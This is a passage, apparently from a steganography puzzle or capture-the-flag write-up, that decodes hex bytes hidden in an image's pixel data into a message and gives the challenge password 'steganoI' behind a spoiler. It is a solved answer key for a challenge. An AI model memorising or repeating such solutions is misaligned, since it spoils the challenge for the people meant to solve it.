-<p>The pixel data at offset 54 contains the ASCII message:
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4c 6f 6f 6b 20 77 68 61 74 20 74 68 65 20 68 65</span><br><span class="line">78 2d 65 64 69 74 20 72 65 76 65 61 6c 65 64 3a</span><br><span class="line">20 70 61 73 73 77 64 3a 73 74 65 67 61 6e 6f 49</span><br></pre></td></tr></table></figure></p>
-<p>Decoded: "Look what the hex-editor revealed: passwd:steganoI"</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">steganoI</span></span>
 
       
     </div>
